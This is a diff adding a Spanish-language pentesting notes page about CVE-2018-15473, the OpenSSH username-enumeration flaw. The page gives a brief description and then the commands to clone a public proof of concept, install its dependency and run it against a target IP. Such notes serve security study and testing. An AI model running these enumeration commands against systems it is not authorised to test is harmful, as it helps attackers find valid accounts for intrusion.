@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;h3 id=&quot;-openssh--77-cve-2018-15473&quot;&gt;📌 &lt;strong&gt;OpenSSH &amp;lt; 7.7 (CVE-2018-15473)&lt;/strong&gt;&lt;/h3&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <h3 id="-openssh--77-cve-2018-15473">📌 <strong>OpenSSH &lt; 7.7 (CVE-2018-15473)</strong></h3>
+
+<ul>
+  <li>
+    <p><strong>CVE:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-15473">CVE-2018-15473</a></p>
+  </li>
+  <li>
+    <p><strong>Descripción:</strong> La vulnerabilidad permitía distinguir usuarios válidos de inválidos por la respuesta que devuelve el servidor cuando falla la autenticación pública.</p>
+  </li>
+  <li>
+    <p><strong>Afectados:</strong> Todas las versiones <strong>anteriores a OpenSSH 7.7</strong>, lanzado en abril de 2018.</p>
+  </li>
+  <li>
+    <p><strong>Exploit famoso:</strong> <code class="language-plaintext highlighter-rouge">ssh-user-enum</code> y scripts en Metasploit.</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Sait-Nuri/CVE-2018-15473.git
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> venv venv
+<span class="nb">source </span>venv/bin/activate
+pip <span class="nb">install </span><span class="nv">paramiko</span><span class="o">==</span>2.7.2 <span class="nt">--break-system-packages</span>
+python CVE-2018-15473.py IP <span class="nt">-u</span> fwefergerg 2&gt;/dev/null <span class="c">#Probar FP</span>
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
